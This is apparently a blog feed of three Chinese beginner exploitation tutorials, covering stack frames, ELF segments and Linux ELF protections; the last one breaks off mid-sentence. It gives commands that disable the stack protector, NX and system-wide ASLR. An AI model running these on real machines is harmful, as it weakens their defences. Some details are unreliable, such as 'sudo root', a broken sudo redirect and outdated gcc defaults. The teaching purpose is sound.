        <content type="html"><![CDATA[<p>本文使用Intel 的32位为例子进行举例。64位本质上和32位类似，主要区别在于函数参数的调用方式，文章结尾会简要提及。</p><p>重新回顾一下栈pop和push指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 将0x50的压入栈</span><br><span class="line">push 0x50</span><br></pre></td></tr></table></figure><p><img src="/../picture/pwn1.1.2/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 将esp指向的数据放入指定的寄存器中</span><br><span class="line">pop 寄存器名字</span><br><span class="line">比如 ：pop eax</span><br><span class="line">执行之后eax的值就变成了0x50</span><br></pre></td></tr></table></figure><p><img src="/../picture/pwn1.1.2/2.png"></p><h3 id="栈帧是什么"><a href="#栈帧是什么" class="headerlink" title="栈帧是什么?"></a>栈帧是什么?</h3><p><code>栈帧</code>，也就是stack frame，<code>其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。栈帧有栈顶和栈底之分，其中栈顶的地址最低，栈底的地址最高，SP(栈指针)就是一直指向栈顶的。在x86-32bit中，我们用 ebp 指向栈底，也就是基址指针；用 esp 指向栈顶</code>，也就是栈指针。下面是一个栈帧的示意图：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一段有问题的C语言代码，仅仅只是用作C语言函数调用流程的介绍，为了方便读者理解</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span> )</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span> ) ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../picture/pwn1.1.2/3.png"><br>我们来详细分析一下上面的这个图和那一小段代码</p><p>1.其实<code>main函数</code>只是我们作为程序员认为的程序的入口，实际上在<code>main函数</code>之前编译器还会添加很多函数比如<code>start函数</code>等等，所以<code>main函数</code>的栈帧之前还是有<code>栈帧</code>的</p><p>2.最开始进入到main函数中，还没有执行<code>func(参数1, 参数2 ,参数3 ) ;</code>这条代码的时候<br><img src="/../picture/pwn1.1.2/4.png"></p><p>3.<code>func(参数1, 参数2 ,参数3 ) ;</code> 这一条语句在汇编语言中会被翻译成为<code>call func</code><br>而在执行<code>call func</code>之前程序会执行一些<code>push指令</code>将func函数的<code>参数1,2,3</code>分别压入栈中<br>也就是<code>push 参数3</code>  <code>push 参数2</code>  <code>push 参数1</code> 这三条指令。执行完之后那么栈的内容会变成这样:<br><img src="/../picture/pwn1.1.2/5.png"></p><p>4.然后参数到位了就可以执行<code>call func</code>了。<br>而<code>call func</code>这个指令其实可以近似理解成<code>push eip + jmp func_addr</code>这两个指令的组合<br>如下图执行<code>call func</code>前后栈和<code>eip指针</code>的情况<br><img src="/../picture/pwn1.1.2/6.png"><br>当然图中的代码段是我自己猜测的，不够准确，因为本文的目的是介绍函数调用的过程，所以没有考虑过多只是希望尽可能简单的将整个过程讲解清楚。</p><p>5.我们已经知道了执行<code>call func</code>之后的<code>栈</code>和<code>eip</code>的位置<br>然后我们介绍一下每个函数开头的初始化<code>push ebp</code>和<code>mov ebp, esp</code><br>执行 <code>push ebp</code> 之后<br><img src="/../picture/pwn1.1.2/7.png"><br>执行 <code>mov ebp, esp</code> 之后<br><img src="/../picture/pwn1.1.2/8.png"><br>我们可以看到执行了<code>mov ebp, esp</code>之后<code>ebp指针</code>和<code>esp指针</code>指向了同一个地址，也就是<code>ebp 旧值</code> 所在的位置</p><p>6.在上一步中我们的<code>esp</code>和<code>ebp</code>处于同一个位置，然后我们需要执行<code>sub esp, 0x??</code>(这里打?是因为我不知道具体应该减去多少),这个<code>sub指令</code>在这里的作用是将<code>esp</code>向下移动，用于开出新函数所需要的栈帧，执行之后如下图:<br><img src="/../picture/pwn1.1.2/9.png"></p><p>7.最后我们直接来看func函数的最后一条<code>leave指令</code><br><code>leave指令</code>是<code>mov esp，ebp</code>和<code>pop ebp</code>的结合<br>我们来一条一条的看，先看 <code>mov esp, ebp</code> 执行之后的效果<br><img src="/../picture/pwn1.1.2/10.png"><br>这条指令会重新将<code>esp</code>和<code>ebp</code>移动到同一个位置<br>然后再来看 <code>pop ebp</code> 执行之后的效果<br><img src="/../picture/pwn1.1.2/11.png"><br>我们发现此时<code>ebp</code>回到<code>最初在main函数中它的位置</code>，而<code>esp</code>因为<code>pop</code>会向上移动一格位置，来到了<code>eip旧地址储存的位置</code>(这是后面会提到的栈溢出的关键部分)</p><p>8.紧接着我们就会执行<code>ret指令</code>，这个<code>ret指令</code>的作用相当于 <code>pop eip</code> 也就是将<code>esp</code>现在指向的值，赋值给<code>eip</code>，执行完这个语句之后，我们来看看eip在哪。如图:<br><img src="/../picture/pwn1.1.2/12.png"><br>我们可以看到，<code>栈</code>一切都回到了<code>call func</code> 这个指令执行之前，只有<code>eip</code>的位置改变了，仿佛它从没来过…</p><p>到此为止<code>32位程序</code>函数的调用以及栈的变化就结束了，可以得到一个结论就是<code>函数调用前后，栈内状况不变</code>。其实这非常好理解，因为在一个函数中调用另外一个函数当然不能影响原函数的运行，所以<code>栈</code>的设计做到了<code>用完就丢</code>。被调用函数结束后<code>esp</code>和<code>ebp</code>的位置都会回到<code>call</code>这个指令之前的状态，而<code>esp</code>和<code>ebp</code>之间的数据也都没有改变<br>上述结论在<code>64位</code>中同样适用，而<code>64位程序</code>和<code>32位程序</code>除了位数上不同，最大的不同就在于<code>64位程序</code>会优先将<code>被调用函数的参数</code>存放在寄存器中</p><p>这是32位函数调用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一段有问题的C语言代码，仅仅只是用作C语言函数调用流程的介绍，为了方便读者理解</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span> )</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span> ) ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../picture/pwn1.1.2/5.png"></p><p>而这是64位函数调用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一段有问题的C语言代码，仅仅只是用作C语言函数调用流程的介绍，为了方便读者理解</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span>, 参数<span class="number">4</span>, 参数<span class="number">5</span> ,参数<span class="number">6</span>, 参数<span class="number">7</span>, 参数<span class="number">8</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(参数<span class="number">1</span>, 参数<span class="number">2</span> ,参数<span class="number">3</span>, 参数<span class="number">4</span>, 参数<span class="number">5</span> ,参数<span class="number">6</span>, 参数<span class="number">7</span>, 参数<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在64位程序中，函数的参数会依次放入<code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code> 这六个寄存器中，只有把这六个寄存器塞满后，才会<code>从右到左</code>依次放入<code>栈</code>中，像上面的代码，<code>func函数</code>有<code>8个参数</code>，那么就如图所示:<br><img src="/../picture/pwn1.1.2/13.png"><br><code>注意:64位所用的是位数更多更大的RSP和RBP</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实程序本身的流程并不困难，只是初学者对汇编语言的了解较少所以难以理解，如果对于文章内容难以理解，不妨寻找一些汇编语言的教程较为系统的了解汇编语言也许会有所帮助</p><p>(制作图片用的是win11自带的画图工具，里面的字体大小不知道为什么调节不了，所以出现了字体很小的情况，<code>(。・＿・。)ﾉI’m sorry~</code>)</p><p>参考文献:<br><a href="https://www.yuque.com/cyberangel/rg9gdm/gcz7x2">PWN入门（1-1-1）-C函数调用过程原理及函数栈帧分析（Intel） (yuque.com)</a><br><a href="https://segmentfault.com/a/1190000007977460">linux - C函数调用过程原理及函数栈帧分析 - 编程之道 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF 文件格式和程序段解析(简版)</title>
      <link href="/2024/06/13/ELF%20%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%92%8C%E7%A8%8B%E5%BA%8F%E6%AE%B5%E8%A7%A3%E6%9E%90(%E7%AE%80%E7%89%88)/"/>
      <url>/2024/06/13/ELF%20%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%92%8C%E7%A8%8B%E5%BA%8F%E6%AE%B5%E8%A7%A3%E6%9E%90(%E7%AE%80%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<p><strong>ELF (Executable and Linkable Format)</strong>: 是一种用于 <code>可执行文件</code>、<code>目标文件</code> 和 <code>库</code> 的文件格式，类似于 Windows 下的 <strong>PE</strong> 文件格式。</p><p>ELF 主要包括三种类型的文件：</p><ul><li><strong>可重定位文件 (relocatable)</strong>: 编译器和汇编器产生的 <code>.o</code> 文件，由 <strong>Linker</strong> 处理。</li><li><strong>可执行文件 (executable)</strong>: <strong>Linker</strong> 对 <code>.o</code> 文件进行处理后输出的文件，代表进程映像。</li><li><strong>共享对象文件 (shared object)</strong>: 动态库文件，通常是 <code>.so</code> 文件。</li></ul><p>ELF 文件包含多个段，每个段承担不同的作用。以下是一些入门级 PWN 可能需要用到的段（仅介绍这些基本段）：</p><ol><li><strong>.text</strong>: 用于保存程序中的代码片段。</li><li><strong>.data</strong>: 用于保存已经初始化的全局变量和局部变量。</li><li><strong>.bss</strong>: 用于保存未初始化的全局变量和局部变量。</li><li><strong>.plt</strong>: 用于链接和跳转到对应的 <strong>.got</strong> 表。</li><li><strong>.got.plt</strong>: 存储对应函数的真实地址的表。</li><li><strong>.rodata</strong>: 只读数据</li><li><strong>.init</strong>: 程序初始化和终止的代码</li></ol><p><img src="/../picture/pwn1.1.0/aaa.png"></p><p>ELF 文件中的段在程序执行前会被加载到内存中,然后在计算机内存中<br>一个程序可以认为由<code>bss段</code>、<code>data段</code>、<code>text段</code>三个部分组成的。<br><code>text段</code>和<code>data段</code>都存在可执行文件当中，程序执行时，系统从可执行文件中加载至内存<br>而<code>bss段</code>在可执行文件中只是一个符号用于占位，由系统根据其符号进行初始化</p><p>如何加载:<br><img src="/../picture/pwn1.1.0/ELF%E5%92%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB2.png"></p><h3 id="text-段"><a href="#text-段" class="headerlink" title=".text 段"></a><strong>.text 段</strong></h3><ul><li><strong>代码段 (code segment)</strong>: 用来存放 <code>程序执行的代码</code>。</li><li>这个段的大小在程序执行之前就已经确定，因为编译好的程序代码量一般是固定的。</li><li>该段通常有读和执行权限，但一般禁止修改（当然，也有部分特殊架构允许修改代码段）。</li><li>在代码段中，可能也包含一些常数变量，例如字符串。</li></ul><h3 id="data-段"><a href="#data-段" class="headerlink" title=".data 段"></a><strong>.data 段</strong></h3><ul><li><strong>数据段 (data segment)</strong>: 用来存放已经 <code>初始化的全局变量</code>。</li><li>数据段属于静态内存分配，即被程序分配后大小不再改变。</li></ul><p><strong>例子</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> str[<span class="number">30</span>] = <span class="string">&quot;i_am_xidp_and_i_love_pwn&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述例子中，已经被赋值好的数据 <code>str</code> 会被放在 <strong>.data</strong> 段中。由于其大小是固定的，因此 <strong>.data</strong> 段中的数据也是固定大小的。</p><h3 id="bss-段"><a href="#bss-段" class="headerlink" title=".bss 段"></a><strong>.bss 段</strong></h3><ul><li><strong>bss 段 (bss segment)</strong>: 用于存放程序中未初始化的全局变量。</li><li>和 <strong>.data</strong> 段一样，属于静态内存分配。</li></ul><p><strong>例子</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> str[<span class="number">30</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>.bss</strong> 段本身不会占用 ELF 文件的实际大小，它在 ELF 等可执行文件中只是一个符号用于占位。程序执行时，会根据这个符号在计算机中分配相应的内存大小。</p><p><strong>数据区</strong>: <strong>.data</strong> 段和 <strong>.bss</strong> 段通常被称为数据区。</p><p>参考文献:<br><a href="https://www.cnblogs.com/QiQi-Robotics/p/15573352.html">Linux可执行文件格式-ELF结构详解 - 我叫平沢唯 - 博客园 (cnblogs.com)</a><br><a href="https://www.yuque.com/cyberangel/rg9gdm/yom93l">PWN入门（1-1-2）-bss段、data段、text段、堆(heap)和栈(stack) (yuque.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> ELF </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础操作和ELF文件保护</title>
      <link href="/2024/06/13/Linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E5%92%8CELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4/"/>
      <url>/2024/06/13/Linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E5%92%8CELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="基础Linux指令"><a href="#基础Linux指令" class="headerlink" title="基础Linux指令"></a>基础Linux指令</h3><ol><li><p><strong>查看当前目录</strong>：</p><ul><li><code>pwd</code>：打印当前工作目录路径。</li><li><img src="/../picture/pwn1.1.3/pwd.png"></li></ul></li><li><p><strong>列出目录内容</strong>：</p><ul><li><code>ls</code>：列出当前目录的文件和文件夹。</li><li><code>ls -l</code>：显示详细信息。</li><li><code>ls -a</code>：显示所有文件，包括隐藏文件。</li><li><img src="/../picture/pwn1.1.3/ls.png"></li></ul></li><li><p><strong>切换目录</strong>：</p><ul><li><code>cd 目录名</code>：进入指定目录。</li><li><code>cd ..</code>：返回上级目录。</li><li><img src="/../picture/pwn1.1.3/cd.png"></li></ul></li><li><p><strong>创建文件和目录</strong>：</p><ul><li><code>touch 文件名</code>：创建空文件。</li><li><code>mkdir 目录名</code>：创建新目录。</li></ul></li><li><p><strong>删除文件和目录</strong>：</p><ul><li><code>rm 文件名</code>：删除文件。</li><li><code>rm -r 目录名</code>：递归删除目录及其内容。</li></ul></li><li><p><strong>移动和重命名文件</strong>：</p><ul><li><code>mv 源文件 目标</code>：移动或重命名文件或目录。</li></ul></li><li><p><strong>复制文件和目录</strong>：</p><ul><li><code>cp 源文件 目标</code>：复制文件。</li><li><code>cp -r 源目录 目标</code>：递归复制目录。</li></ul></li><li><p><strong>查看文件内容</strong>：</p><ul><li><code>cat 文件名</code>：显示文件内容。</li><li><code>less 文件名</code>：分页查看文件内容，适合查看长文件。</li></ul></li><li><p><strong>编辑文件</strong>：</p><ul><li><code>nano 文件名</code> 或 <code>vim 文件名</code>：使用nano或vim编辑文件。</li></ul></li><li><p><strong>查找文件</strong>：</p><ul><li><code>find /路径 -name 文件名</code>：在指定路径下查找文件。</li></ul></li><li><p><strong>显示系统信息</strong>：</p><ul><li><code>uname -a</code>：显示系统信息。</li><li><code>top</code>：查看当前运行的进程和系统资源使用情况。</li></ul></li><li><p><strong>查看和管理进程</strong>：</p><ul><li><code>ps aux</code>：列出所有进程。</li><li><code>kill 进程ID</code>：终止指定进程。</li></ul></li><li><p><strong>清空当前页面</strong>：</p><ul><li><code>clear</code></li></ul></li><li><p><strong>获取管理员权限</strong>：</p><p>第一次登入的时候你会发现你没有设置root权限</p><ul><li><code>sudo +命令</code>：以超级用户权限执行命令。<code>sudo</code> 允许普通用户临时获取管理员权限来执行特定任务。</li><li><code>sudo root</code>：输入密码后成为高级用户(输入的密码是看不见的)。</li></ul></li><li><p><strong>输入文本内容</strong>：</p><ul><li><code>cat</code>：显示文件内容</li><li><img src="/../picture/pwn1.1.3/cat.png"></li></ul></li></ol><h3 id="ELF文件保护"><a href="#ELF文件保护" class="headerlink" title="ELF文件保护"></a>ELF文件保护</h3><p>Linux ELF文件的保护主要有四种:<br>Canary<br>NX<br>PIE<br>RELRO<br>分别用于应付不同的漏洞,同时后面我们也会学习绕过它们的方法,下面让我们来分别了解它们的工作原理和起到的保护作用</p><h4 id="1-Canary"><a href="#1-Canary" class="headerlink" title="1.Canary"></a>1.Canary</h4><p><code>Canary</code>是金丝雀的意思。技术上表示最先的测试的意思。<br>这个来自以前挖煤的时候，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以大家都用Canary来搞最先的测试。</p><p><code>Linux的Canary</code>指的是在<code>ebp/rbp旧值之前</code>添加的一串随机数(不超过机械字长)(也叫做cookie)，<code>当程序会在执行到此处的时候会检测Canary的值是否和刚开始的一样，如果出现缓冲区溢出攻击，覆盖到了Canary(也就是Canary的值发生了改变)，系统检测到Canary的值发生了变化，那么程序会立马崩溃，以防止被篡改的程序执行奇怪的东西</code></p><p>而<code>Canary</code>的末位一定是<code>\x00</code>。<code>\x00</code>是一个用于表示字符串结束的符号，也就是说类似<code>puts函数</code>这类函数输出字符串的时候遇到<code>\x00</code>就会停止继续输出(同样<code>strcpy函数</code>复制字符串的时候遇到<code>\x00</code>也会停止,后面会讲到这个<code>\x00</code>也有不同的用法可以绕过一些检测)。</p><p>之所以<code>Canary</code>的<code>末位</code>添加<code>\x00</code>是因为计算机往往是<code>小端程序</code>。比如:<br><code>Canary</code>是<code>0x1122334455667700</code>。<br>那么在计算机中储存的时候它是:<code>\x00\x77\x66\x55\x44\x33\x22\x11</code>这样储存的<br>那么<code>\x00</code>就在内存的开头了，当<code>Canary</code>前面有字符串需要输出的时候，一直到<code>Canary</code>的<code>\x00</code>就会停下。这使得<code>Canary</code>不会被输出，以此保护<code>Canary</code>不泄露(之后我们会讲到一种绕过<code>Canary</code>的方法就是尝试覆盖掉这个<code>\x00</code>让<code>Canary</code>被<code>puts</code>之类的函数输出)</p><p>GCC开启Canary和关闭Canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-<span class="built_in">stack</span>-protector -o test test.c <span class="comment">//禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o test test.c <span class="comment">//启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o test test.c <span class="comment">//启用堆栈保护，为所有函数插入保护代码</span></span><br><span class="line">-fno-<span class="built_in">stack</span>-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</span><br></pre></td></tr></table></figure><p>Canary所在的位置和GCC编译器以及系统有关:<br>下面以Ubuntu系统举例:<br><img src="/../picture/pwn1.1.3/aaa.png"><br><code>注意</code>:前面的文章中我制作的图片都是使用<code>上面为高地址，下面为低地址</code>(因为初学者都相对自然的认为<code>上高下低</code>),但是此处我采用了<code>上低下高</code>。因为在后续我们做PWN题目的时候使用gdb调试,在gdb中查看<code>栈</code>，栈中的内容是<code>上低下高</code>的，图中所看到的情况也符合我们即将在gdb中看到的情况。所以为了让大家能够适应后续的gdb调试这里使用了<code>上低下高</code>，</p><p>所以总的来说,对于Ubuntu来说，32为程序的Canary一般在 <code>ebp - 0xc</code> 的地方(32位的一格是0x4，也就是在ebp的上面3格)。而 64位的Canary则是在 <code>rbp - 0x8</code> 的位置(64位的一格是0x8，也就是在ebp的上面1格，他们相邻)</p><h4 id="2-NX保护"><a href="#2-NX保护" class="headerlink" title="2.NX保护"></a>2.NX保护</h4><p><code>NX</code>即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行。</p><p>这个保护有什么用呢?<br>我们都知道程序分为<code>代码段</code>和<code>数据段</code>，代码段用于执行，数据段用于存储数据，那么我们可以在数据段写入一些代码吗?答案是可以的，但是程序执行什么由ip指针说了算，ip指哪就运行什么。那如果我们在数据段写入我们想要的代码，然后再想个办法把ip指针骗过来了呢?<br>这样就像银行卡里的数字自己可以改一样，非常逆天(后续我们会学到，这种逆天的攻击方法叫ret2shellcode,但是开启NX之后几乎就无效了)。<br>所以有了NX保护，它的任务就是让<code>数据段</code>坚决不能执行(在<code>Ubuntu20</code>版本之后，系统默认了数据段就是无法执行的，哪怕没有开启<code>NX</code>也不能执行数据段里面的东西)</p><p>GCC开启和关闭NX保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o test test.c <span class="comment">// 禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o test test.c <span class="comment">// 开启NX保护</span></span><br><span class="line">-z execstack / -z <span class="title function_">noexecstack</span> <span class="params">(关闭 / 开启)</span></span><br></pre></td></tr></table></figure><h4 id="3-PIE与ASLR"><a href="#3-PIE与ASLR" class="headerlink" title="3.PIE与ASLR"></a>3.PIE与ASLR</h4><p>从我个人认为PIE与ASLR是非常麻烦的保护,它们的作用是让<code>地址空间分布随机化</code></p><p><strong>ASLR（libc地址随机化）</strong><br><code>ASLR</code>（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置，从而增加了利用软件漏洞进行攻击的难度。 <code>开启不同等级会有不同的效果</code>：</p><ol><li><code>内存布局随机化</code>： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。 ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和 代码的位置。 </li><li><code>地址空间范围的随机化</code>： ASLR还会随机化进程的地址空间范围。在<code>传统的地址空间</code>中，栈、 堆、代码段和数据段通常会被<code>分配到固定的地址</code>范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。 </li><li><code>随机偏移量</code>： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</li><li><code>堆和栈随机化</code>： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起 始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置， 使得攻击者无法轻易地覆盖返回地址或控制程序流程。</li></ol><p>和PIE不同，PIE用于随机化代码段和数据段，ASLR用于将libc库以及堆栈的地址随机化。而ASLR是Linux系统本身提供的保护机制。<br>Linux下的ASLR分为三个级别，0,1,2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>：就是关闭ASLR，没有随机化，堆栈地址每次都相同，并且libc.so的每次地址也都相同</span><br><span class="line"><span class="number">1</span>：就是普通ASLR，mmap基地址、栈基地址、.so加载地址都将被随机化，但是堆并没有被随机化</span><br><span class="line"><span class="number">2</span>：就是增强ASLR，比起<span class="number">1</span>增加了堆随机化</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以查看Linux系统里面ASLR的强度等级</span></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment">// 可以改变ASLR等级,可能会遇到权限问题</span></span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment">// 如果遇到权限问题，可以su root之后再执行</span></span><br><span class="line"><span class="comment">// 或者尝试下面这两条指令</span></span><br><span class="line">sudo -s echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sudo bash -c <span class="string">&#x27;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>PIE</strong><br>PIE能够使得程序像共享库一样在主存的任何位置装载，在需要将程序编译成位置无关<br>开放后code与data会随着ASLR变化地址<br><code>IDA</code>以及<code>gdb</code>执行的时候就只能看到地址后面的<code>末尾三位数</code></p><p>GCC开启和关闭PIE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认情况下，不开启PIE</span></span><br><span class="line">gcc -fpie -pie -o test test.c <span class="comment">// 开启PIE，此时强度为1</span></span><br><span class="line">gcc -fPIE -pie -o test test.c <span class="comment">// 开启PIE，此时为最高强度2</span></span><br><span class="line">gcc -fpic -o test test.c <span class="comment">// 开启PIC，此时强度为1，不会开启PIE</span></span><br><span class="line">gcc -fPIC -o test test.c <span class="comment">// 开启PIC，此时为最高强度2，不会开启PIE</span></span><br><span class="line">-no-pie / -pie (关闭 / 开启)</span><br></pre></td></tr></table></figure><h4 id="4-RELRO"><a href="#4-RELRO" class="headerlink" title="4.RELRO"></a>4.RELRO</h4><p><code>Relocation Read-Only (RELRO)</code> 可以使程序某些部分成为只读的。<br>它分为两种：<code>Partial RELRO</code> 和 <code>Full RELRO</code>，即：部分RELRO 和 完全RELRO。</p><p><code>部分RELRO</code> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。</p><p><code>完全RELRO</code> 使整个 GOT 